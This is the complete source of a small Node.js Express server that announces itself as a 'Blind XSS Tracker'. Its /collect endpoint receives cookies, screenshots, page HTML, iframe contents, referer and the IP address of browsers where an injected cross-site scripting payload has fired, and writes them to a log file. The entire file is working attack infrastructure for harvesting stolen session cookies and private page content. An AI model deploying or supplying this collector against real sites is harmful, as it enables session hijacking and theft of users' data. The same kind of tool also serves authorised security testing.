const express = require('express');
const fs = require('fs');
const path = require('path');
const bodyParser = require('body-parser');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(bodyParser.json({ limit: '15mb' })); // Big enough for screenshots
app.use(bodyParser.urlencoded({ extended: true }));

// Create screenshots folder if missing
if (!fs.existsSync('screenshots')) {
  fs.mkdirSync('screenshots');
}

app.post('/collect', (req, res) => {
  const {
    screenshot,
    cookies,
    userAgent,
    referer,
    origin,
    html,
    iframe,
    time
  } = req.body;

  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

  // Save screenshot if exists
  let screenshotPath = null;
  if (screenshot) {
    const base64Data = screenshot.replace(/^data:image\/png;base64,/, "");
    screenshotPath = `screenshots/screenshot-${Date.now()}.png`;
    fs.writeFileSync(screenshotPath, base64Data, 'base64');
  }

  // Save log
  const logEntry = {
    ip,
    userAgent,
    referer,
    origin,
    cookies,
    html,
    iframe,
    time,
    screenshot: screenshotPath
  };

  console.log("🚨 Blind XSS Triggered:", logEntry);
  fs.appendFileSync('logs.txt', JSON.stringify(logEntry) + "\n");

  res.status(200).send('OK');
});

app.get('/', (req, res) => {
  res.send('👀 Blind XSS Tracker is running.');
});

app.listen(PORT, () => {
  console.log(`✅ Server started on port ${PORT}`);
});
